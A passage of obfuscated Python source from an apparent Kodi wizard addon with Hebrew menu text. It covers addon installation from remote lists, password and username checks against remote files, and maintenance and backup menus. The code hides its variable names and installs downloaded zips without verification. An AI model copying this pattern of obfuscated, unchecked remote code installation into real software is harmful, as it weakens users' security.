								OOOOO0OO0OO0O0OO0 ="[COLOR green][Installed][/COLOR] %s"%OOOOO0OO0OO0O0OO0 #line:2486
						except :#line:2487
							pass #line:2488
						O0OO0O0O0OO0OOOOO +=1 #line:2489
						addFile (OOOOO0OO0OO0O0OO0 ,'addoninstall',O0000OOO0OOO0OO0O ,OOO0000000O0O0000 ,description =OOO0O000OOOOO00OO ,icon =O00OO0OO0OO00OOO0 ,fanart =O0O0OOOO0000O0000 ,themeit =THEME2 )#line:2490
					if O0OO0O0O0OO0OOOOO <1 :#line:2491
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2492
			else :#line:2493
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2494
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2495
		else :#line:2496
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2497
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2498
			addFile ('%s'%OOOOOO00OOO0OOOO0 ,'',themeit =THEME3 )#line:2499
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2500
	setView ('files','viewType')#line:2501
def addonInstaller (O0O000OOOOOOO00O0 ,OO00O00OOO0OO0O00 ):#line:2503
	if not ADDONFILE =='http://':#line:2504
		OO0O0O0OOOO00O00O =wiz .workingURL (OO00O00OOO0OO0O00 )#line:2505
		if OO0O0O0OOOO00O00O ==True :#line:2506
			O000O0OOOO0O00OO0 =wiz .openURL (OO00O00OOO0OO0O00 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2507
			O00OOO00O00OO00OO =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0O000OOOOOOO00O0 ).findall (O000O0OOOO0O00OO0 )#line:2508
			if len (O00OOO00O00OO00OO )>0 :#line:2509
				for OOO0OO00OO0O000OO ,OO00O00OOO0OO0O00 ,O00OO000OO0OOO0O0 ,OO0O0000OOOOO00OO ,O0O0OO0O000OOO0O0 ,O0O0OOO0O0O0O0O0O ,OO0O00000OOO00O0O ,O0OOO00O0O000OO0O ,O0OO0O0000000OOOO in O00OOO00O00OO00OO :#line:2510
					if os .path .exists (os .path .join (ADDONS ,O0O000OOOOOOO00O0 )):#line:2511
						O0OOOOO00OOOO0OO0 =['Launch Addon','Remove Addon']#line:2512
						O00O0O0OO0O0OO0OO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O0OOOOO00OOOO0OO0 )#line:2513
						if O00O0O0OO0O0OO0OO ==0 :#line:2514
							wiz .ebi ('RunAddon(%s)'%O0O000OOOOOOO00O0 )#line:2515
							xbmc .sleep (1000 )#line:2516
							return True #line:2517
						elif O00O0O0OO0O0OO0OO ==1 :#line:2518
							wiz .cleanHouse (os .path .join (ADDONS ,O0O000OOOOOOO00O0 ))#line:2519
							try :wiz .removeFolder (os .path .join (ADDONS ,O0O000OOOOOOO00O0 ))#line:2520
							except :pass #line:2521
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0O000OOOOOOO00O0 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2522
								removeAddonData (O0O000OOOOOOO00O0 )#line:2523
							wiz .refresh ()#line:2524
							return True #line:2525
						else :#line:2526
							return False #line:2527
					OO000OOOOOOOO0OOO =os .path .join (ADDONS ,O00OO000OO0OOO0O0 )#line:2528
					if not O00OO000OO0OOO0O0 .lower ()=='none'and not os .path .exists (OO000OOOOOOOO0OOO ):#line:2529
						wiz .log ("Repository not installed, installing it")#line:2530
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O0O000OOOOOOO00O0 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00OO000OO0OOO0O0 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2531
							O00O0000OO00OOO0O =wiz .parseDOM (wiz .openURL (OO0O0000OOOOO00OO ),'addon',ret ='version',attrs ={'id':O00OO000OO0OOO0O0 })#line:2532
							if len (O00O0000OO00OOO0O )>0 :#line:2533
								O0OO00OO0OOOO0O0O ='%s%s-%s.zip'%(O0O0OO0O000OOO0O0 ,O00OO000OO0OOO0O0 ,O00O0000OO00OOO0O [0 ])#line:2534
								wiz .log (O0OO00OO0OOOO0O0O )#line:2535
								if KODIV >=17 :wiz .addonDatabase (O00OO000OO0OOO0O0 ,1 )#line:2536
								installAddon (O00OO000OO0OOO0O0 ,O0OO00OO0OOOO0O0O )#line:2537
								wiz .ebi ('UpdateAddonRepos()')#line:2538
								wiz .log ("Installing Addon from Kodi")#line:2540
								OO0O00OO0OOO00O00 =installFromKodi (O0O000OOOOOOO00O0 )#line:2541
								wiz .log ("Install from Kodi: %s"%OO0O00OO0OOO00O00 )#line:2542
								if OO0O00OO0OOO00O00 :#line:2543
									wiz .refresh ()#line:2544
									return True #line:2545
							else :#line:2546
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O00OO000OO0OOO0O0 )#line:2547
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O0O000OOOOOOO00O0 ,O00OO000OO0OOO0O0 ))#line:2548
					elif O00OO000OO0OOO0O0 .lower ()=='none':#line:2549
						wiz .log ("No repository, installing addon")#line:2550
						OO00OOOOOOO00OOOO =O0O000OOOOOOO00O0 #line:2551
						O0000O0O0OOO00000 =OO00O00OOO0OO0O00 #line:2552
						installAddon (O0O000OOOOOOO00O0 ,OO00O00OOO0OO0O00 )#line:2553
						wiz .refresh ()#line:2554
						return True #line:2555
					else :#line:2556
						wiz .log ("Repository installed, installing addon")#line:2557
						OO0O00OO0OOO00O00 =installFromKodi (O0O000OOOOOOO00O0 ,False )#line:2558
						if OO0O00OO0OOO00O00 :#line:2559
							wiz .refresh ()#line:2560
							return True #line:2561
					if os .path .exists (os .path .join (ADDONS ,O0O000OOOOOOO00O0 )):return True #line:2562
					O0OOO0OO00O0O0O0O =wiz .parseDOM (wiz .openURL (OO0O0000OOOOO00OO ),'addon',ret ='version',attrs ={'id':O0O000OOOOOOO00O0 })#line:2563
					if len (O0OOO0OO00O0O0O0O )>0 :#line:2564
						OO00O00OOO0OO0O00 ="%s%s-%s.zip"%(OO00O00OOO0OO0O00 ,O0O000OOOOOOO00O0 ,O0OOO0OO00O0O0O0O [0 ])#line:2565
						wiz .log (str (OO00O00OOO0OO0O00 ))#line:2566
						if KODIV >=17 :wiz .addonDatabase (O0O000OOOOOOO00O0 ,1 )#line:2567
						installAddon (O0O000OOOOOOO00O0 ,OO00O00OOO0OO0O00 )#line:2568
						wiz .refresh ()#line:2569
					else :#line:2570
						wiz .log ("no match");return False #line:2571
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2572
		else :wiz .log ("[Addon Installer] Text File: %s"%OO0O0O0OOOO00O00O )#line:2573
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2574
def installFromKodi (OOOOOO00OO00OOO0O ,over =True ):#line:2576
	if over ==True :#line:2577
		xbmc .sleep (2000 )#line:2578
	wiz .ebi ('RunPlugin(plugin://%s)'%OOOOOO00OO00OOO0O )#line:2580
	if not wiz .whileWindow ('yesnodialog'):#line:2581
		return False #line:2582
	xbmc .sleep (1000 )#line:2583
	if wiz .whileWindow ('okdialog'):#line:2584
		return False #line:2585
	wiz .whileWindow ('progressdialog')#line:2586
	if os .path .exists (os .path .join (ADDONS ,OOOOOO00OO00OOO0O )):return True #line:2587
	else :return False #line:2588
def installAddon (O0OOO000OO0O000O0 ,O00OO0O00O00O00O0 ):#line:2590
	if not wiz .workingURL (O00OO0O00O00O00O0 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0OOO000OO0O000O0 ,COLOR2 ));return #line:2591
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2592
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO000OO0O000O0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2593
	OOO0O00O0OO00O00O =O00OO0O00O00O00O0 .split ('/')#line:2594
	OOO0O000O0OOO00O0 =os .path .join (PACKAGES ,OOO0O00O0OO00O00O [-1 ])#line:2595
	try :os .remove (OOO0O000O0OOO00O0 )#line:2596
	except :pass #line:2597
	downloader .download (O00OO0O00O00O00O0 ,OOO0O000O0OOO00O0 ,DP )#line:2598
	OO0O0000000OOOO00 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO000OO0O000O0 )#line:2599
	DP .update (0 ,OO0O0000000OOOO00 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2600
	OO0OO00000OOOOOO0 ,OOO0OOO000O0OOOO0 ,O0OO0000O00000OO0 =extract .all (OOO0O000O0OOO00O0 ,ADDONS ,DP ,title =OO0O0000000OOOO00 )#line:2601
	DP .update (0 ,OO0O0000000OOOO00 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2602
	installed (O0OOO000OO0O000O0 )#line:2603
	installDep (O0OOO000OO0O000O0 ,DP )#line:2604
	DP .close ()#line:2605
	wiz .ebi ('UpdateAddonRepos()')#line:2606
	wiz .ebi ('UpdateLocalAddons()')#line:2607
	wiz .refresh ()#line:2608
def installDep (OOO0O0OOOO0O0O00O ,DP =None ):#line:2610
	OOO0OOO0OO00O0000 =os .path .join (ADDONS ,OOO0O0OOOO0O0O00O ,'addon.xml')#line:2611
	if os .path .exists (OOO0OOO0OO00O0000 ):#line:2612
		OOO00O0OOOO0OO0OO =open (OOO0OOO0OO00O0000 ,mode ='r');OO000O0O0OOOO0O00 =OOO00O0OOOO0OO0OO .read ();OOO00O0OOOO0OO0OO .close ();#line:2613
		OO0OOOO00O000OO00 =wiz .parseDOM (OO000O0O0OOOO0O00 ,'import',ret ='addon')#line:2614
		for O0OOO00000OO0OO0O in OO0OOOO00O000OO00 :#line:2615
			if not 'xbmc.python'in O0OOO00000OO0OO0O :#line:2616
				if not DP ==None :#line:2617
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OOO00000OO0OO0O ))#line:2618
				wiz .createTemp (O0OOO00000OO0OO0O )#line:2619
def installed (OO00O0O0OOOO0O00O ):#line:2646
	OO0000O000000O0OO =os .path .join (ADDONS ,OO00O0O0OOOO0O00O ,'addon.xml')#line:2647
	if os .path .exists (OO0000O000000O0OO ):#line:2648
		try :#line:2649
			OOO0OO000OO0O0OOO =open (OO0000O000000O0OO ,mode ='r');OO0O0OOOOOO0O000O =OOO0OO000OO0O0OOO .read ();OOO0OO000OO0O0OOO .close ()#line:2650
			O0OO0O00O00OOOO0O =wiz .parseDOM (OO0O0OOOOOO0O000O ,'addon',ret ='name',attrs ={'id':OO00O0O0OOOO0O00O })#line:2651
			O00000OO0OOO0O000 =os .path .join (ADDONS ,OO00O0O0OOOO0O00O ,'icon.png')#line:2652
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO0O00O00OOOO0O [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O00000OO0OOO0O000 )#line:2653
		except :pass #line:2654
def youtubeMenu (url =None ):#line:2656
	if not YOUTUBEFILE =='http://':#line:2657
		if url ==None :#line:2658
			O00OO0O00OO0OO0O0 =wiz .workingURL (YOUTUBEFILE )#line:2659
			O0O00OOO0O0OO0O0O =uservar .YOUTUBEFILE #line:2660
		else :#line:2661
			O00OO0O00OO0OO0O0 =wiz .workingURL (url )#line:2662
			O0O00OOO0O0OO0O0O =url #line:2663
		if O00OO0O00OO0OO0O0 ==True :#line:2664
			O00O00OO0O000OO0O =wiz .openURL (O0O00OOO0O0OO0O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2665
			OOO0OO000OOOO0OOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00O00OO0O000OO0O )#line:2666
			if len (OOO0OO000OOOO0OOO )>0 :#line:2667
				for OO0OOOO00O0O0OO00 ,OOO0OOOOO00OOOO00 ,url ,OOO0OO0O000000000 ,OO00OO00O000000O0 ,O00OO0OOOO0O0OOO0 in OOO0OO000OOOO0OOO :#line:2668
					if OOO0OOOOO00OOOO00 .lower ()=="yes":#line:2669
						addDir ("[B]%s[/B]"%OO0OOOO00O0O0OO00 ,'youtube',url ,description =O00OO0OOOO0O0OOO0 ,icon =OOO0OO0O000000000 ,fanart =OO00OO00O000000O0 ,themeit =THEME3 )#line:2670
					else :#line:2671
						addFile (OO0OOOO00O0O0OO00 ,'viewVideo',url =url ,description =O00OO0OOOO0O0OOO0 ,icon =OOO0OO0O000000000 ,fanart =OO00OO00O000000O0 ,themeit =THEME2 )#line:2672
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2673
		else :#line:2674
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2675
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2676
			addFile ('%s'%O00OO0O00OO0OO0O0 ,'',themeit =THEME3 )#line:2677
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2678
	setView ('files','viewType')#line:2679
def STARTP ():#line:2680
	OO000O00O0OOOOO0O =(ADDON .getSetting ("pass"))#line:2681
	if BUILDNAME =="":#line:2682
	 if not NOTIFY =='true':#line:2683
          OOOOOO00O0O0OO000 =wiz .workingURL (NOTIFICATION )#line:2684
	 if not NOTIFY2 =='true':#line:2685
          OOOOOO00O0O0OO000 =wiz .workingURL (NOTIFICATION2 )#line:2686
	 if not NOTIFY3 =='true':#line:2687
          OOOOOO00O0O0OO000 =wiz .workingURL (NOTIFICATION3 )#line:2688
	O0O000O00000O0000 =OO000O00O0OOOOO0O #line:2689
	OOOOOO00O0O0OO000 =urllib2 .Request (SPEED )#line:2690
	OO00O00O0OOOO00OO =urllib2 .urlopen (OOOOOO00O0O0OO000 )#line:2691
	O0O0O0OO0O0O0OO00 =OO00O00O0OOOO00OO .readlines ()#line:2693
	OO0O00OOOOO0O0000 =0 #line:2697
	for OO0O00O0O00O0OOOO in O0O0O0OO0O0O0OO00 :#line:2698
		if OO0O00O0O00O0OOOO .split (' ==')[0 ]==OO000O00O0OOOOO0O or OO0O00O0O00O0OOOO .split ()[0 ]==OO000O00O0OOOOO0O :#line:2699
			OO0O00OOOOO0O0000 =1 #line:2700
			break #line:2701
	if OO0O00OOOOO0O0000 ==0 :#line:2702
					OOOOO000OOOO0OOOO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2703
					if OOOOO000OOOO0OOOO :#line:2705
						ADDON .openSettings ()#line:2707
						sys .exit ()#line:2709
					else :#line:2710
						sys .exit ()#line:2711
	return 'ok'#line:2715
def STARTP2 ():#line:2716
	OOOO0O0000OO000O0 =(ADDON .getSetting ("user"))#line:2717
	OOOO00O0OOOOOO000 =(UNAME )#line:2719
	OOO00O0OO000O0O00 =urllib2 .urlopen (OOOO00O0OOOOOO000 )#line:2720
	OOOOO0OOO00OO0000 =OOO00O0OO000O0O00 .readlines ()#line:2721
	OO00O0OOO0OO0OOO0 =0 #line:2722
	for O00000OOOOO00OO0O in OOOOO0OOO00OO0000 :#line:2725
		if O00000OOOOO00OO0O .split (' ==')[0 ]==OOOO0O0000OO000O0 or O00000OOOOO00OO0O .split ()[0 ]==OOOO0O0000OO000O0 :#line:2726
			OO00O0OOO0OO0OOO0 =1 #line:2727
			break #line:2728
	if OO00O0OOO0OO0OOO0 ==0 :#line:2729
		OOO0O0O00O00O0000 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2730
		if OOO0O0O00O00O0000 :#line:2732
			ADDON .openSettings ()#line:2734
			sys .exit ()#line:2737
		else :#line:2738
			sys .exit ()#line:2739
	return 'ok'#line:2743
def passandpin ():#line:2744
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2745
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2746
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2747
def passandUsername ():#line:2748
	ADDON .openSettings ()#line:2749
def folderback ():#line:2752
    O00000OO0O000O0O0 =ADDON .getSetting ("path")#line:2753
    if O00000OO0O000O0O0 :#line:2754
      O00000OO0O000O0O0 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2755
      ADDON .setSetting ("path",O00000OO0O000O0O0 )#line:2756
def backmyupbuild ():#line:2759
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2763
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2764
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2765
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2767
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2768
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2769
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2771
def maintMenu (view =None ):#line:2775
	OO00O0O00OOO0O00O ='[B][COLOR green]ON[/COLOR][/B]';OOOO0000O000OOO0O ='[B][COLOR red]OFF[/COLOR][/B]'#line:2777
	O0OO0O00OOO00OO0O ='true'if AUTOCLEANUP =='true'else 'false'#line:2778
	O000OOOO0OO000OO0 ='true'if AUTOCACHE =='true'else 'false'#line:2779
	OOOO0O000O00O0OO0 ='true'if AUTOPACKAGES =='true'else 'false'#line:2780
	OO00O00O0O000O00O ='true'if AUTOTHUMBS =='true'else 'false'#line:2781
	OO0000OO0OOO00O00 ='true'if SHOWMAINT =='true'else 'false'#line:2782
	O0OOO0OOOO000000O ='true'if INCLUDEVIDEO =='true'else 'false'#line:2783
	O00OOOO0OOO0000O0 ='true'if INCLUDEALL =='true'else 'false'#line:2784
	O0OO00OO0OO0OOOO0 ='true'if THIRDPARTY =='true'else 'false'#line:2785
	if wiz .Grab_Log (True )==False :OOOO0OOO0O000O000 =0 #line:2786
	else :OOOO0OOO0O000O000 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2787
	if wiz .Grab_Log (True ,True )==False :OOO00000OO0OOO00O =0 #line:2788
	else :OOO00000OO0OOO00O =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2789
	OO0OO0O0O0O000O00 =int (OOOO0OOO0O000O000 )+int (OOO00000OO0OOO00O )#line:2790
	OO00O000O0OOO0OO0 =str (OO0OO0O0O0O000O00 )+' Error(s) Found'if OO0OO0O0O0O000O00 >0 else 'None Found'#line:2791
	O0000OO000O0OOOO0 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2792
	if O00OOOO0OOO0000O0 =='true':#line:2793
		O00O0O00000O0OOO0 ='true'#line:2794
		O0000O0O0O00O00O0 ='true'#line:2795
		OO0OOOO0O0000O0OO ='true'#line:2796
		O0OOO000000O000OO ='true'#line:2797
		O000OO000OOO000OO ='true'#line:2798
		OOOO000000O0O000O ='true'#line:2799
		O00OOO000O0OOOOO0 ='true'#line:2800
		OOOOO000O0OOOOO00 ='true'#line:2801
	else :#line:2802
		O00O0O00000O0OOO0 ='true'if INCLUDEBOB =='true'else 'false'#line:2803
		O0000O0O0O00O00O0 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2804
		OO0OOOO0O0000O0OO ='true'if INCLUDESPECTO =='true'else 'false'#line:2805
		O0OOO000000O000OO ='true'if INCLUDEGENESIS =='true'else 'false'#line:2806
		O000OO000OOO000OO ='true'if INCLUDEEXODUS =='true'else 'false'#line:2807
		OOOO000000O0O000O ='true'if INCLUDEONECHAN =='true'else 'false'#line:2808
		O00OOO000O0OOOOO0 ='true'if INCLUDESALTS =='true'else 'false'#line:2809
		OOOOO000O0OOOOO00 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2810
	O0O000O00OOOO000O =wiz .getSize (PACKAGES )#line:2811
	OOO000OO0O0OOO0OO =wiz .getSize (THUMBS )#line:2812
	OO000OOO0OOOOOO0O =wiz .getCacheSize ()#line:2813
	OO00000OO00OO0OOO =O0O000O00OOOO000O +OOO000OO0O0OOO0OO +OO000OOO0OOOOOO0O #line:2814
	O0O000O000OO0000O =['Daily','Always','3 Days','Weekly']#line:2815
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2816
	if view =="clean"or SHOWMAINT =='true':#line:2817
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO00000OO00OO0OOO ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2818
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO000OOO0OOOOOO0O ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2819
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O000O00OOOO000O ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2820
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO000OO0O0OOO0OO ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2821
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2822
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2823
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2824
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2825
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2826
	if view =="addon"or SHOWMAINT =='false':#line:2827
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2828
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2829
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2830
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2831
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2832
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2834
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2835
	if view =="misc"or SHOWMAINT =='true':#line:2836
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2837
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addFile ('View Errors in Log: %s'%(OO00O000O0OOO0OO0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addFile ('Clear Wizard Log File%s'%O0000OO000O0OOOO0 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2845
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2846
	if view =="backup"or SHOWMAINT =='true':#line:2847
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2850
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2851
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2857
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2859
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2860
	if view =="tweaks"or SHOWMAINT =='true':#line:2861
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2862
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		else :#line:2864
			if os .path .exists (ADVANCED ):#line:2865
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2866
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2867
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2871
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2874
	addFile ('Show All Maintenance: %s'%OO0000OO0OOO00O00 .replace ('true',OO00O0O00OOO0O00O ).replace ('false',OOOO0000O000OOO0O ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2875
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2876
	addFile ('Third Party Wizards: %s'%O0OO00OO0OO0OOOO0 .replace ('true',OO00O0O00OOO0O00O ).replace ('false',OOOO0000O000OOO0O ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2877
	if O0OO00OO0OO0OOOO0 =='true':#line:2878
		O00OOOOO0OO0O0OOO =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2879
		OOOOOO00OOO0OO00O =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2880
		OO0OOOO0O0OOOOO00 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2881
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00OOOOO0OO0O0OOO ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2882
